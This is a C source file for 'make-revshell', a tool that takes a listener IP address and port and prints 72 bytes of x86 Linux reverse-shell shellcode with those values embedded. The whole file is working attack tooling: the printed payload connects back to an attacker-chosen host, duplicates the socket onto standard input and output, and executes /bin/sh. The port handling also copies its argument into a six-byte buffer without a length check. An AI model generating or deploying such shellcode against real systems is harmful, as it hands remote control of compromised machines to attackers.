/******************************************************************
*    make-revshell -- Program to generate reverse shellcode
* 
*    Author   : Re4son re4son [ at ] whitedome.com.au
*    Purpose  : generates reverse shell code with
*               IP address and port given as arguments
*    Usage    : make-revshell --LHOST=<IP address> --LPORT=<port>
******************************************************************/


#include <stdio.h>
#include <string.h>
#include <getopt.h>

int main( int argc, char *argv[] )
{
    unsigned int port, ip1,  ip2, ip3, ip4;
    unsigned char low,high;
    char cmdArg[6], ip[500];
    char c;
    char *byte1, *byte2, *byte3, *byte4;
    int i;


    static const struct option longOpts[] = {
        {"LHOST", required_argument, NULL, 'h'},
        {"lhost", required_argument, NULL, 'h'},
        {"LPORT", required_argument, NULL, 'p'},
        {"lport", required_argument, NULL, 'p'},
        {NULL, 0, NULL, 0}
    };

    port = ip1 =  ip2 = ip3 = ip4 =0;

    while ((c = getopt_long( argc, argv, ":h:p::", longOpts, NULL )) != -1 ) {
        switch (c) {
        case 'h':
 	    byte1 = strtok (optarg,".");
            byte2 = strtok (NULL,".");
            byte3 = strtok (NULL,".");
            byte4 = strtok (NULL,".");

            ip1 = atoi(byte1);
            ip2 = atoi(byte2); 
            ip3 = atoi(byte3); 
            ip4 = atoi(byte4);
            break;

        case 'p':
            strcpy(cmdArg, optarg);
    	    // Make sure that the argument contains nothing but digits
            for (i = 0; i < strlen(cmdArg); i++){
                if (!isdigit(cmdArg[i])){
                    printf("Port must be a number\n");
                    printf("Usage: %s <port>\n", argv[0] );
                return -1;
                }
             }
	      port = atoi(cmdArg);
              high = port >> 8;
              low = (port << 8) >> 8;
	      break;
        }
    }

    if (port == 0 || (ip1 == 0 && ip2 == 0 && ip3 == 0 && ip4 == 0)) {
        printf("Usage: %s --LHOST=<IP address> --LPORT=<port>\n", argv[0] );
	return -1;	
    }


    printf(  "\nShellcode length             : 72 bytes\n\n"
	     "IP Address (%03d.%03d.%03d.%03d) : \\x%02x\\x%02x\\x%02x\\x%02x\n"
	     "Bind port (%05d)            : \\x%02x\\x%02x\n\n"



	     "\"\\x99\\x52\\x42\\x52\\x89\\xd3\\x42\\x52\\x89\\xe1\"\n"
	     "\"\\x6a\\x66\\x58\\x89\\xc7\\xcd\\x80\\x97\\x68\\x%02x\"\n"
	     "\"\\x%02x\\x%02x\\x%02x\\x66\\x68\\x%02x\\x%02x\\x66\\x6a\\x02\"\n"
	     "\"\\x89\\xe1\\x6a\\x10\\x51\\x57\\x89\\xe1\\xb3\\x03\"\n"
	     "\"\\xcd\\x80\\x5b\\x87\\xca\\xb0\\x3f\\xcd\\x80\\x49\"\n"
	     "\"\\x79\\xf9\\x99\\x89\\xd1\\x52\\x68\\x2f\\x2f\\x73\"\n"
	     "\"\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\"\n"
	     "\"\\xcd\\x80\";\n\n", \
	     ip1, ip2, ip3, ip4, ip1, ip2, ip3, ip4, \
	     port, high, low, \
	     ip1, ip2, ip3, ip4, high, low);

    return 0;
}
